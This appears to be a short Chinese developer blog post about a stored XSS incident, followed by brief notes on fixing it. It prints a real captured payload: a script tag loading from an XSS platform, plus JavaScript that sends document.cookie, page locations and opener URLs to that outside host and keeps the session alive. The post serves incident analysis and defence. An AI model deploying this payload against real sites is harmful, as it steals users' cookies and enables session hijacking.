## xss攻击
### 问题描述
* 早上上班，技术群有人贴出了一个图：用户的输入是一个script脚本，被存在数据库的一个字段中

```ecma script level 4
<script src=https://xsspt.com/E0KlIS></script>北京
```

* 访问连接，可以看到具体的脚本内容如下：

```ecma script level 4
(function(){(new Image()).src='https://xsspt.com/index.php?do=api&id=E0KlIS&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if('1'==1){keep=new Image();keep.src='https://xsspt.com/index.php?do=keepsession&id=E0KlIS&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
```

* 它的主要作用是获取用户的cookie，从而可以窃取用户的信息

## 防范
* 大概想了一下修复方法：

### 转换用户的输入
* 也就是将用户的输入进行实体转换，将特殊字符转换成实体字符
* 通常情况下，在开发中我一般是将用户的输入进行转义，这样可以防止一些sql注入
* 但是转义无法解决上方描述的问题，因为展示的时候，还是会将那些字符展示的页面上
* 从而在用户的浏览器端执行注入脚本
* 因此要想解决这个问题，需要限定用户的输入，例如使用select的选择框，替代input输入
* 在后端时，将特殊字符转换成实体字符，因为在业务场景下，一般可以枚举出需要的输入字符集范围，可以使用正则进行替换过滤
* 如果你有什么好办法，欢迎提出issue进行讨论

